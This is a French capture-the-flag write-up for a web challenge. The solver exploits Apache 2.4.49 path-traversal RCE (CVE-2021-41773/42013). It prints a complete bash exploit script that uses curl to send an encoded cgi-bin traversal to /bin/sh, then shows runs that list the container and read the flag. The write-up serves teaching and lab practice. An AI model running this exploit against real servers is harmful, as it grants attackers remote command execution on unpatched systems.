# Web : Site en maintenance
**Challenge Author(s)**: SevenInside
**Difficulty**: Facile

## Synopsis

Le site semble être en travaux, comment faire pour en prendre le contrôle.

## Steps to solve

Les premières recherches ne donnent pas grand chose. La seule information qui nous être transmis dans les headers HTTP est la version d'apache utilisée : `Apache/2.4.49`.

Assez rapidement, après quelques recherches sur Internet, il semblerait que cette version d'Apache est vulnérable à une RCE (Remote-Code Execution), permettant ainsi de prendre directement le contrôle du conteneur (Lien utile : <https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773-cve-2021-42013>).

En envoyant directement des requêtes HTTP craftées pour le site, on arrive à effectivement faire fonctionner la vulnérabilité et à récupérer le flag qui se trouve à la racine du conteneur.

Un exploit est disponible sur exploitDB : <https://www.exploit-db.com/exploits/50383>. Sinon il est tout à fait envisageable de créer son propre exploit.

```bash
admin@HIT2025 hackintregor % cat script_web_apache_rce.sh
#!/bin/bash
# Usage: ./apache_rce.sh http://IP:PORT "id"
if [ $# -ne 2 ]; then
echo "Usage: $0 <URL> <command>"
echo "Example: $0 http://web-team-X.local:8081 \"id\""
exit 1
fi
TARGET="$1"
CMD="$2"
# Encoded path traversal to reach /bin/sh
TRAVERSAL_PATH="/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
echo "[*] Target: $TARGET"
echo "[*] Executing: $CMD"
echo
# Send the payload
curl -s --path-as-is -X POST "$TARGET$TRAVERSAL_PATH" \
-d "echo Content-Type: text/plain; echo; $CMD"
admin@HIT2025 hackintregor %
```

En exploitant le script, on liste les fichiers présent à la racine du conteneur

```bash
admin@HIT2025 hackintregor % ./script_web_apache_rce.sh http://web-team-X.local:8081 "ls -la /"
[*] Target: http://web-team-X.local:8081
[*] Executing: ls -la /
total 68
drwxr-xr-x 1 root root 4096 Jul 3 07:39 .
drwxr-xr-x 1 root root 4096 Jul 3 07:39 ..
-rwxr-xr-x 1 root root 0 Jul 3 07:39 .dockerenv
-rw-r--r-- 1 root root 32 Jun 30 07:04 FLAG-HIT.txt
lrwxrwxrwx 1 root root 7 Jun 30 00:00 bin -> usr/bin
drwxr-xr-x 2 root root 4096 May 9 14:50 boot
drwxr-xr-x 5 root root 340 Jul 3 07:39 dev
drwxr-xr-x 1 root root 4096 Jul 3 07:39 etc
drwxr-xr-x 2 root root 4096 May 9 14:50 home
lrwxrwxrwx 1 root root 7 Jun 30 00:00 lib -> usr/lib
lrwxrwxrwx 1 root root 9 Jun 30 00:00 lib64 -> usr/lib64
drwxr-xr-x 2 root root 4096 Jun 30 00:00 media
drwxr-xr-x 2 root root 4096 Jun 30 00:00 mnt
drwxr-xr-x 2 root root 4096 Jun 30 00:00 opt
dr-xr-xr-x 178 root root 0 Jul 3 07:39 proc
drwx------ 2 root root 4096 Jun 30 00:00 root
drwxr-xr-x 3 root root 4096 Jun 30 00:00 run
lrwxrwxrwx 1 root root 8 Jun 30 00:00 sbin -> usr/sbin
drwxr-xr-x 2 root root 4096 Jun 30 00:00 srv
```

Permettant ainsi de retrouver le flag final :

```bash
admin@l-mac-elodie hackintregor % ./script_web_apache_rce.sh http://web-team-X:8081 "cat /FLAG-HIT.txt"
[*] Target: http://web-team-X:8081
[*] Executing: cat /FLAG-HIT.txt
hit{Mettezàjoursvosprogrammes!}%
```